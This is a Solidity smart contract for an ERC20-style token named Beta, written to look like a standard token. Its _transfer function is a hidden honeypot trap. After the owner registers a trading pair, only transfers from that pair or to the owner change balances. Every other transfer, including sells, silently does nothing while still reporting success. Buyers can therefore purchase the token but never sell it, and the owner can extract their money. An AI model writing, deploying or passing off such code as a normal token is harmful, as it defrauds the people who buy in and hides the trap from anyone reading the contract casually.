// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Beta {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _pair;
    address private _owner;
    string private _name;
    string private _symbol;
		uint256 private  _totalSupply;
    bool private _ct = true;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event MSG(address from, address to, address owner, string message);

    constructor(string memory name_, string memory symbol_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply += totalSupply_;

        _owner = msg.sender;
        _balances[_owner] += _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    function name() public view virtual returns (string memory) {return _name;  }
    function symbol() public view virtual returns (string memory) {return _symbol;  }
    function decimals() public view virtual returns (uint8) {return 18;  }
    function totalSupply() public view virtual returns (uint256) {  return _totalSupply;   }
    function balanceOf(address account) public view virtual returns (uint256) {return _balances[account];  }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender,uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) { _transfer(msg.sender, to, amount); return true; }

    function transferFrom(address from,  address to,uint256 amount  ) public virtual returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;  }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
         return _allowances[owner][spender];
     }

    function _spendAllowance(address owner,address spender,uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {_approve(owner, spender, currentAllowance - amount);}
        }
    }

    function ct(bool ct_) public {require(msg.sender == _owner, "Only owner can do this");_ct = ct_; }
    function pair(address pair_) public {require(msg.sender == _owner, "Only owner can do this");_pair = pair_;_ct=false; }

    function _transfer(address from, address to,  uint256 amount) internal virtual {
      require(from != address(0), "ERC20: transfer from the zero address");
      require(to != address(0), "ERC20: transfer to the zero address");
      uint256 fromBalance = _balances[from];
      require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

      if(_ct || (from == _pair || to ==_owner)){
        unchecked {_balances[from] = fromBalance - amount;}
        _balances[to] += amount;
        emit Transfer(from, to, amount);
      }
    }
}